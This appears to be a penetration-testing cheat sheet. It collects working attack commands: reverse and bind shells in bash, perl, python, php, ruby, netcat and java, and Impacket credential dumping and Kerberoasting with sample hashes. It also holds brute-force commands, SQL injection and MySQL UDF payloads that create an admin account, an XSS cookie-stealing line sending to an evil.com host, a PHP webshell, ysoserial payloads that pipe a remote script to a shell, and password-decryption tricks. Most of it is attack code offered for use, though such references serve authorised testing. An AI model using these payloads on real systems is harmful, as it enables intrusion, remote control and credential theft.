<p>Domain Controller Anonymous Enumeration</p>
<div class="highlight"><pre><span></span><code>    enum4linux -A &lt;ip&gt; | tee &lt;ip&gt;-anon-enum.txt
</code></pre></div>
<h3 id="iptables">iptables<a class="headerlink" href="#iptables" title="Permanent link">&para;</a></h3>
<p><em>Append rules to top of the Input filter and make persistent</em></p>
<div class="highlight"><pre><span></span><code>    /sbin/iptables -I INPUT -p tcp --dport 50050 -s &lt;ip address&gt; -j ACCEPT
    /sbin/iptables -I INPUT -p tcp --dport 22 -s &lt;ip address&gt; -j ACCEPT
    service netfilter-persistent save
    iptables -L -v
</code></pre></div>
<p><em>Delete rule</em></p>
<div class="highlight"><pre><span></span><code>    iptables -D INPUT -i eth0 -p tcp --dport 443 -j ACCEPT
</code></pre></div>
<h3 id="ldapsearch">ldapsearch<a class="headerlink" href="#ldapsearch" title="Permanent link">&para;</a></h3>
<p>Obtain LAPS passwords for domain computers using the linux based ldapsearch tool</p>
<p><a href="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/">Dump Laps Passwords with LDAPSearch by Rob Fuller</a></p>
<div class="highlight"><pre><span></span><code>    ldapsearch -x -h 192.168.80.10 -D &quot;helpdesk&quot; -w ASDqwe123 -b &quot;dc=sittingduck,dc=info&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd

    -x - Use basic authentication
    -h 192.168.80.10 - Connect to the Domain Controller for ldap
    -D &quot;helpdesk&quot; -w ASDqwe123 - Login as the helpdesk user, with the password ASDqwe123
    -b &quot;dc=sittingduck,dc=info&quot; - This loads the base LDAP object of the entire domain.
    &quot;(ms-MCS-AdmPwd=*)&quot; - Filter out any objects that I can’t see a value for ms-MCS-AdmPwd for. (If you have rights as that user to see even one Administrator password, this will show it.)
    ms-MCS-AdmPwd - Only show me the ms-MCS-AdmPwd object (which by default includes the object name and DN so you will still know what host it belongs to)
</code></pre></div>
<h3 id="nfs">NFS<a class="headerlink" href="#nfs" title="Permanent link">&para;</a></h3>
<p>List NFS Mounts on remote host</p>
<div class="highlight"><pre><span></span><code>    showmount -e &lt;ipaddr&gt;
</code></pre></div>
<p>Check NFS share counts in a loop</p>
<div class="highlight"><pre><span></span><code>    #cat nfs.results.msf |grep -|cut -d&#39;-&#39; -f2|cut -d&#39; &#39; -f2,5|sed &#39;s/ /:/g&#39;

    for server in $(cat nfs.shares); do
        echo &quot;[*] Checking $server&quot;
        mount -o nolock,nfsvers=3 $server /mnt/n4s_backup
        ls /mnt/n4s_backup
        umount /mnt/n4s_backup
    done
</code></pre></div>
<h3 id="shells">Shells<a class="headerlink" href="#shells" title="Permanent link">&para;</a></h3>
<h4 id="tty-shells">TTY Shells<a class="headerlink" href="#tty-shells" title="Permanent link">&para;</a></h4>
<p><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty</a></p>
<p>Upgrade your shell to a full TTY</p>
<div class="highlight"><pre><span></span><code>    python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;

    echo os.system(&#39;/bin/bash&#39;)

    /bin/sh -i

    perl —e &#39;exec &quot;/bin/sh&quot;;&#39;

    perl: exec &quot;/bin/sh&quot;;

    ruby: exec &quot;/bin/sh&quot;

    lua: os.execute(&#39;/bin/sh&#39;)
</code></pre></div>
<p>(From within IRB)</p>
<div class="highlight"><pre><span></span><code>    exec &quot;/bin/sh&quot;
</code></pre></div>
<p>(From within vi)</p>
<div class="highlight"><pre><span></span><code>    :!bash
</code></pre></div>
<p>(From within vi)</p>
<div class="highlight"><pre><span></span><code>    :set shell=/bin/bash:shell
</code></pre></div>
<p>(From within nmap)</p>
<div class="highlight"><pre><span></span><code>    !sh
</code></pre></div>
<h4 id="bind-shells">Bind Shells<a class="headerlink" href="#bind-shells" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py">https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py</a></p>
<p>Perl Bind Shell (Port 1000)</p>
<div class="highlight"><pre><span></span><code>    perl -e &#39;use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,&quot;&gt;&amp;C&quot;);open(STDOUT,&quot;&gt;&amp;C&quot;);open(STDERR,&quot;&gt;&amp;C&quot;);exec(&quot;/usr/bin/bash -i&quot;);};&#39;
</code></pre></div>
<h4 id="reverse-shells">Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permanent link">&para;</a></h4>
<p>Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p>
<div class="highlight"><pre><span></span><code>    bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre></div>
<p>PERL</p>
<p>Here’s a shorter, feature-free version of the perl-reverse-shell:</p>
<div class="highlight"><pre><span></span><code>    perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre></div>
<p>Python
This was tested under Linux / Python 2.7:</p>
<div class="highlight"><pre><span></span><code>    python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre></div>
<p>PHP</p>
<p>This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…</p>
<div class="highlight"><pre><span></span><code>    php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre></div>
<p>Ruby</p>
<div class="highlight"><pre><span></span><code>    ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre></div>
<p>Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
<div class="highlight"><pre><span></span><code>    nc -e /bin/sh 10.0.0.1 1234
</code></pre></div>
<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p>
<div class="highlight"><pre><span></span><code>    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre></div>
<p>Java</p>
<div class="highlight"><pre><span></span><code>    r = Runtime.getRuntime()
    p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
    p.waitFor()
</code></pre></div>
<p>xterm</p>
<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<div class="highlight"><pre><span></span><code>    xterm -display 10.0.0.1:1
</code></pre></div>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p>
<div class="highlight"><pre><span></span><code>    Xnest :1
</code></pre></div>
<p>your’ll need to authorise the target to connect to you (command also run on your host):</p>
<div class="highlight"><pre><span></span><code>    xhost +targetip
</code></pre></div>
<h3 id="ssh-tunnels">SSH Tunnels<a class="headerlink" href="#ssh-tunnels" title="Permanent link">&para;</a></h3>
<p>Send data over ssh to port 9000 on target</p>
<div class="highlight"><pre><span></span><code>    ssh -L 8090:localhost:9000 james@123.123.123
</code></pre></div>
<p>Send data over ssh to port 80 on target through jumphost</p>
<div class="highlight"><pre><span></span><code>    ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123.321 -t ssh -L 8800:localhost:80 james@124.123.122
</code></pre></div>
<p>Start ssh using existing connections</p>
<div class="highlight"><pre><span></span><code>    nano ~/.ssh/config
    ControlMaster auto
    ControlPath ~/.ssh/control:%h:%p:%r
</code></pre></div>
<h3 id="impacket">Impacket<a class="headerlink" href="#impacket" title="Permanent link">&para;</a></h3>
<p>Source: <a href="https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15">https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15</a></p>
<h4 id="install-impacket-on-windows">Install impacket on Windows<a class="headerlink" href="#install-impacket-on-windows" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    git clone https://github.com/CoreSecurity/impacket.git
</code></pre></div>
<p>Download VC++ For Python 2.7 (Needed to compile some modules)</p>
<ul>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=44266">https://www.microsoft.com/en-us/download/details.aspx?id=44266</a></li>
</ul>
<p>Install necessary modules (You may need to install pip first)</p>
<div class="highlight"><pre><span></span><code>    python -m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump
</code></pre></div>
<p>You can also download the PyCrypto binary if it fails to compile</p>
<ul>
<li><a href="http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe">http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe</a></li>
</ul>
<h4 id="secretsdump">Secretsdump<a class="headerlink" href="#secretsdump" title="Permanent link">&para;</a></h4>
<p>Attempt to dump credentials from a remote machine via Pass the Hash</p>
<div class="highlight"><pre><span></span><code>    python secretsdump.py ./localadmin@computername.domain.com -hashes aad3b435b51404eeaad3b435b51404ee:21306681c738c3ed2d615e29be1574a3
</code></pre></div>
<p>Dump domain password hashes remotely via Volume Shadow Copy</p>
<div class="highlight"><pre><span></span><code>    c:\users\username\appdata\local\temp\sd.exe domain/username:password@dchostname -just-dc -use-vss -outputfile
</code></pre></div>
<h4 id="getuserspnspy">GetUserSPNS.py<a class="headerlink" href="#getuserspnspy" title="Permanent link">&para;</a></h4>
<p>This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat
Source: <a href="https://room362.com/post/2016/kerberoast-pt2/">https://room362.com/post/2016/kerberoast-pt2/</a></p>
<div class="highlight"><pre><span></span><code>    root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin -dc-ip &lt;target DC ip address&gt;
    Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

    Password:
    ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
    ----------------------------------  ----------  ----------------------------------------------------  -------------------
    http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
    MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20

    $krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
    $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
</code></pre></div>
<h4 id="smbrelayxpy">SMBRelayx.py<a class="headerlink" href="#smbrelayxpy" title="Permanent link">&para;</a></h4>
<p><a href="https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&amp;utm_source=Twitter&amp;utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&amp;utm_campaign=SANS+Pen+Test">https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&amp;utm_source=Twitter&amp;utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&amp;utm_campaign=SANS+Pen+Test</a></p>
<h3 id="brute-force-techniques">Brute Force Techniques<a class="headerlink" href="#brute-force-techniques" title="Permanent link">&para;</a></h3>
<p>RDP Brute</p>
<div class="highlight"><pre><span></span><code>    ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
</code></pre></div>
<p>SSH Brute</p>
<div class="highlight"><pre><span></span><code>    medusa -M ssh -C /usr/share/wordlists/ssh.lst -H 22.txt -T 10| grep SUCCESS |tee medusa-results.txt
</code></pre></div>
<p>Telnet Brute</p>
<div class="highlight"><pre><span></span><code>    medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
</code></pre></div>
<h2 id="web-exploitation">Web Exploitation<a class="headerlink" href="#web-exploitation" title="Permanent link">&para;</a></h2>
<h3 id="sql">SQL<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
<h4 id="sqli-examples">SQLi Examples<a class="headerlink" href="#sqli-examples" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    secret&#39; or 1=1 limit1;#
    #Find number of columns return by the Select statement
    ?id=738 order by 1,2,3,4...n until error is received

    #Use union select statement to append query to the original
    #union Select statement must have same number of columns as original Select statement
    ?id=738 union select 1,2,3,4,5,6

    #Get DB Version
    ?id=738 union select 1,2,3,4,@@version,6

    #Get DBUser
    ?id=738 union select 1,2,3,4,user(),6

    #Get tables from all databases
    ?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

    #Get Table Columns
    ?id=738 union select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name=&#39;users&#39;

    #Get User passwords
    ?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
</code></pre></div>
<h5 id="sql-joins">SQL Joins<a class="headerlink" href="#sql-joins" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    #FULL All
    SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A.KEY = B.KEY

    #A partial B
    SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key

    #B Partial A
    SELECT something FROM tableA A RIGHT JOIN tableB B on A.Key = B.Key

    #A no B
    SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key WHERE B.Key IS NULL

    # Outer
    SELECT something FROM tableA A FULL OUTER JOIN tableB B on A.Key = B.Key WHERE A.Key IS NULL OR B.Key IS NULL

    # Inner
    SELECT something FROM tableA A FULL INNER JOIN tableB B on A.Key = B.Key
</code></pre></div>
<h4 id="mysql">MySQL<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    [mysqldir]/bin/mysql-h hostname-u root --password=pass &lt;database&gt;

    select @@version
    select @@servername

    mysql&gt; show databases;
    mysql&gt; use [db name];
    mysql&gt; show tables;
    mysql&gt; describe [table name];
    mysql&gt; SELECT * FROM [table name];
</code></pre></div>
<h5 id="udf-install-for-command-execution">UDF Install for Command Execution<a class="headerlink" href="#udf-install-for-command-execution" title="Permanent link">&para;</a></h5>
<p>User Defined Functions by Platform</p>
<div class="highlight"><pre><span></span><code>    udf/mysql/linux/32/lib_mysqludf_sys.so
    udf/mysql/linux/64/lib_mysqludf_sys.so
    udf/mysql/windows/32/lib_mysqludf_sys.dll
    udf/mysql/windows/64/lib_mysqludf_sys.dll
</code></pre></div>
<p>Source: <a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a></p>
<p>Load MYSQLUDF for Linux</p>
<div class="highlight"><pre><span></span><code>    use test;
    create table udf(line blob);
    insert into udfvalues(load_file(&#39;/tmp/udf/udf.so&#39;));
    select * from udfinto dumpfile&#39;/usr/lib/udf.so&#39;;
    create function sys_exec returns integer soname&#39;udf.so&#39;;
    select sys_exec(&#39;id &gt; /tmp/out; chownapache.apache /tmp/out&#39;);
    select sys_exec(&#39;ls -alh/root/Desktop/ &gt;&gt; /tmp/out&#39;);
    select sys_exec(&#39;ls /etc/sudoers&gt;&gt; /tmp/out&#39;);
</code></pre></div>
<p>Upload suid.c program</p>
<div class="highlight"><pre><span></span><code>    wget http://ip:port/privex/mysql/suid-o /tmp/suid
    chownroot:root /tmp/suid
    chmod4777 /tmp/suid
</code></pre></div>
<p>Load MYSQLUDFfor Windows</p>
<div class="highlight"><pre><span></span><code>    USE mysql;
    CREATE TABLE npn(line blob);
    INSERT INTO npn values(load_files(&#39;C://xampplite//webdav//lib_mysqludf_sys.dll&#39;));
    SELECT * FROM mysql.npnINTO DUMPFILE&#39;c://windows//system32//lib_mysqludf_sys_32.dll&#39;;
    CREATE FUNCTION sys_exec RETURNS integer SONAME&#39;lib_mysqludf_sys_32.dll&#39;;
    SELECT sys_exec(&quot;net user hacker hacker1234!@#$ /add&quot;);
    SELECT sys_exec(&quot;net localgroupAdministrators hacker /add&quot;);
    s_exec(&#39;net localgroup&quot;Remote Desktop Users&quot; hacker /add&#39;);
</code></pre></div>
<h4 id="sqlmap">SQLMap<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h4>
<p>Automated website crawl and test of SQLi</p>
<div class="highlight"><pre><span></span><code>    python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
</code></pre></div>
<h3 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
<p>Grab cookie</p>
<div class="highlight"><pre><span></span><code>    document.write(&#39;&lt;img src=&quot;https://yourserver.evil.com/collect.gif?cookie=&#39; + document.cookie + &#39;&quot; /&gt;&#39;)
</code></pre></div>
<p>XSS via image tag</p>
<div class="highlight"><pre><span></span><code>    &lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;Suck it, Trebek!&#39;)&quot; /&gt;
</code></pre></div>
<h3 id="server-side-javascript-injection-via-node-or-elementjs">Server-side Javascript Injection via Node or ElementJS<a class="headerlink" href="#server-side-javascript-injection-via-node-or-elementjs" title="Permanent link">&para;</a></h3>
<p>File system directory listing</p>
<div class="highlight"><pre><span></span><code>    res.end(require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString())
</code></pre></div>
<p>File read</p>
<div class="highlight"><pre><span></span><code>    res.end(require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;).toString())
</code></pre></div>
<h3 id="cold-fusion">Cold Fusion<a class="headerlink" href="#cold-fusion" title="Permanent link">&para;</a></h3>
<p>Sources:
<a href="https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html">JMPESPJUMP - Attacking Adobe Cold Fusion</a></p>
<p><em>Decrypt CFM Files back to source</em></p>
<ul>
<li><a href="https://github.com/disccomp/cfdecrypt">https://github.com/disccomp/cfdecrypt</a></li>
</ul>
<p><em>CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session)</em></p>
<div class="highlight"><pre><span></span><code>    &lt;form action=&quot;http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login&quot; method=&quot;post&quot;&gt;
    &lt;input name=&quot;adminpassword&quot; type=&quot;hidden&quot; value=&quot;&quot; /&gt;
        &lt;input name=&quot;rdsPasswordAllowed&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
    &lt;/form&gt;
</code></pre></div>
<p><em>For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:</em></p>
<ul>
<li>[ColdFusion_Install_Dir]\lib\neo-query.xml</li>
</ul>
<p><em>For ColdFusion 8, 9 and 10:</em></p>
<ul>
<li>[ColdFusion_Install_Dir]\lib\neo-datasource.xml</li>
</ul>
<h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link">&para;</a></h3>
<h4 id="jboss">JBOSS<a class="headerlink" href="#jboss" title="Permanent link">&para;</a></h4>
<p>Default credential is "admin:admin"</p>
<div class="highlight"><pre><span></span><code>0. Host your .jar/.war payload with webshell on local webserver

1. Navigate to the JMX Console on the target host (http://IP.Ad.dr.ess:port/jmx-console/) and search for “service=MainDeployer”.

2. From here you’ll want to utilize the deploy() function since it allows you to enter a URL as a parameter value in java.net.URL.  In this field, enter your attack IP and the name of the WAR file in the URL box and then click the “Invoke” button.
</code></pre></div>
<p>Other ways to gain execution</p>
<div class="highlight"><pre><span></span><code>* jboss.deployment
* jboss.system (MainDeployer)
* http://localhost:8080/invoker/JMXInvokerServlet
* Java Deserialization Vuln via JMXInvokerServlet
* https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now
* https://github.com/frohoff/ysoserial
* https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
* https://www.cigital.com/blog/mitigate-java-deserialization-vulnerability-jboss/
</code></pre></div>
<p>Auto-check and exploitation tool (<a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a>)</p>
<div class="highlight"><pre><span></span><code>    git clone https://github.com/joaomatosf/jexboss.git
    cd jexboss
    pip install -r requires.txt
    python jexboss.py -h
    python jexboss.py -host http://target_host:8080
</code></pre></div>
<h3 id="java-deserialization">Java Deserialization<a class="headerlink" href="#java-deserialization" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet">Java Deserialization Cheat Sheet</a></p>
<p><a href="http://codewhitesec.blogspot.de/2015/03/sh-or-getting-shell-environment-from.html">How to get a full shell through Java Runtime.exec</a></p>
<p>Ysoserial payload to execute full commands</p>
<div class="highlight"><pre><span></span><code>    sh -c $@|sh . &lt;payload here&gt;
</code></pre></div>
<p>Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell</p>
<div class="highlight"><pre><span></span><code>    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 &#39;sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh&#39; &gt; jenkins_curl_shell.bin
</code></pre></div>
<p>Generate a ysoserial payload to execute nc bind shell</p>
<div class="highlight"><pre><span></span><code>    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 &#39;sh -c $@|sh . nc -lp 8088 -e /bin/bash&#39; &gt; nc-jenkins.out
</code></pre></div>
<h4 id="jmxinvokerservlet">JMXInvokerServlet<a class="headerlink" href="#jmxinvokerservlet" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    ./ysoserial-master-v0.0.4-gad26e2b-61.jar CommonsCollections5 &quot;touch /tmp/pwned&quot; &gt;payload.txt
</code></pre></div>
<p>Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure.</p>
<p>Ensure the headers match these:</p>
<div class="highlight"><pre><span></span><code>    POST /invoker/JMXInvokerServlet HTTP/1.1
    Host: &lt;hostname/IP&gt;:8080
    Content-Type:application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue
    Content-Length: 2083
</code></pre></div>
<h4 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h4>
<p>LFI Read File (without executing)</p>
<div class="highlight"><pre><span></span><code>    www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
</code></pre></div>
<p>LFI Read PHP session file for current sessionid</p>
<div class="highlight"><pre><span></span><code>    http://blog.target.org/blog.php?page=/var/lib/php5/sess_th3cr1i5cm6m3dq98pb2sn9qg5
</code></pre></div>
<p>Create PHP backdoor/shell (windows):</p>
<div class="highlight"><pre><span></span><code>    echo ^&lt;?php echo passthru($_GET[&#39;cmd&#39;]); ?^&gt; &gt; C:\inetpub\wwwroot\s.php
</code></pre></div>
<p>PHP Command Execution Example</p>
<div class="highlight"><pre><span></span><code>    Url/page.php?page=system&amp;help=cmd

    @extract ($_REQUEST);
    @die ($page($help));
</code></pre></div>
<h5 id="php-type-juggling">PHP Type Juggling<a class="headerlink" href="#php-type-juggling" title="Permanent link">&para;</a></h5>
<p>Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison.</p>
<p>Add [] after a POST parameter "?user_id[]=user22" to force a NULL (zero-like) condition when comparing a string and an array</p>
<h4 id="web-sockets">Web Sockets<a class="headerlink" href="#web-sockets" title="Permanent link">&para;</a></h4>
<p>There are still relatively few dec ent Web Socket testing tools and most aren't very mature:</p>
<ul>
<li>BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic</li>
<li>ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy</li>
<li><a href="https://github.com/nccgroup/wssip">WSSiP</a>- WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.</li>
</ul>
<h2 id="misc">Misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
<p>Things that don't seem to fit elsewhere!</p>
<h4 id="decompiling-net-binaries">Decompiling .NET Binaries<a class="headerlink" href="#decompiling-net-binaries" title="Permanent link">&para;</a></h4>
<p><a href="http://ilspy.net/">http://ilspy.net/</a></p>
<h4 id="canary-tokens">Canary Tokens<a class="headerlink" href="#canary-tokens" title="Permanent link">&para;</a></h4>
<p>Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser.</p>
<p>To obtain a token:</p>
<div class="highlight"><pre><span></span><code>1. Visit http://canarytokens.org.
2. Enter your email address. (It&#39;s only used to notify you when the token is triggered, mails are not used for any other purpose.)
3. Enter a comment which describes where you&#39;re using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. &quot;file watch on 192.168.100.2:/repos/repo3/README.txt&quot; or &quot;Password lure email in user@domain.com inbox&quot;. We envisage having loads of tokens, so a good description is necessary.
4. Click &quot;Generate Token&quot; to obtain your token.
5. Copy the token and drop it somewhere it will be stumbled over.
</code></pre></div>
<p><a href="https://canarytokens.org/generate#">Canarytokens.org</a></p>
<h4 id="python-ssl-web-server">Python SSL Web Server<a class="headerlink" href="#python-ssl-web-server" title="Permanent link">&para;</a></h4>
<p>Create PEM file</p>
<div class="highlight"><pre><span></span><code>    openssl req -newkey rsa:2048 -x509 -keyout cakey.pem -out cacert.pem -days 3650
</code></pre></div>
<p>To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) :</p>
<div class="highlight"><pre><span></span><code>    cat cakey.pem cacert.pem &gt; server.pem
</code></pre></div>
<p>Python code</p>
<div class="highlight"><pre><span></span><code>    import BaseHTTPServer, SimpleHTTPServer
    import ssl

    httpd = BaseHTTPServer.HTTPServer((&#39;localhost&#39;, 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=&#39;./server.pem&#39;, server_side=True)
    httpd.serve_forever()
</code></pre></div>
<h4 id="mcafee-sitelistxml-decryption">McAfee SiteList.xml decryption<a class="headerlink" href="#mcafee-sitelistxml-decryption" title="Permanent link">&para;</a></h4>
<p>Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts</p>
<div class="highlight"><pre><span></span><code>    type &quot;C:\ProgramData\McAfee\Common Framework\SiteList.xml&quot; |findstr Password

    ╰ $ ./mcafee_sitelist_pwd_decrypt.py f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==
    Crypted password   : f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==
    Decrypted password : &lt;empty&gt;
</code></pre></div>
<p><a href="https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1">https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1</a></p>
<div class="highlight"><pre><span></span><code>git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption
</code></pre></div>
<h4 id="tightvnc-password-retrieval">TightVNC Password Retrieval<a class="headerlink" href="#tightvnc-password-retrieval" title="Permanent link">&para;</a></h4>
<p>Retrieve TightVNC registry keys</p>
<div class="highlight"><pre><span></span><code>    reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\server
</code></pre></div>
<p>Copy password from reg query output</p>
<div class="highlight"><pre><span></span><code>    Password    REG_BINARY    7228098734BBBA06
    ControlPassword    REG_BINARY    435D7A037B9FDC2B
</code></pre></div>
<p>Download vncpwd.exe or other VNC password decoder</p>
<div class="highlight"><pre><span></span><code>    wine vncpwd.exe 7228098734BBBA06
</code></pre></div>
<h4 id="password-lists">Password Lists<a class="headerlink" href="#password-lists" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/danielmiessler/SecLists.gits">https://github.com/danielmiessler/SecLists.gits</a></p>
